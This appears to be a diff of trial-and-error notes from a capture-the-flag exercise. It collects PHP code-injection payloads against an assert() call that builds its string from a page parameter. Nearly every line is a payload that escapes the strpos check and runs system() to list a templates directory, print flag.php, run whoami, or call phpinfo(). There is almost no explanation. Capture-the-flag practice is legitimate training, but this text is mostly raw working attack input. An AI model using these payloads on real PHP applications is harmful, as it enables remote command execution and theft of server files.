@@ -4,6 +4,36 @@ $file = "templates/" . $page . ".php";
 
 assert("strpos('', '..') === false") or die("Detected hacking attempt!");
 
-..','..')===false",system('cat templates/flag.php'));//
+templates/flag'.system("ls templates/;").'.php
+flag'.system("cat templates/flag.php;").'
+
+assert("strpos('flag','..')+or+system('cat+templates/flag.php');//
+','.')===false",system("whoami"));//
+
+flag','..')+or+system('cat+templates/flag.php');//
+
+templates/.','.')===false",system("whoami;"));//
+
+assert("strpos('.','.')===false",system("whoami;"));//
+', '..') === false") or die("Detected hacking attempt!");
 
 templates/flag'.system("ls templates/;").'.php
+
+assert("strpos('
+
+flag'.system("ls templates/;").'
+', '..') === false") or die("Detected hacking attempt!");
+
+
+assert("strpos('templates/flag'.system("ls templates/;").'.php', '..') === false") or die("Detected hacking attempt!");
+
+','') or phpinfo();// 
+
+$file = "templates/" . $page . ".php";
+
+assert("strpos('templates/flag'.system("cat templates/flag.php").'.php', '..') === false") or die("Detected hacking attempt!");
+
+'.system("ls templates/;").'
+'.(echo "123").'
+
+
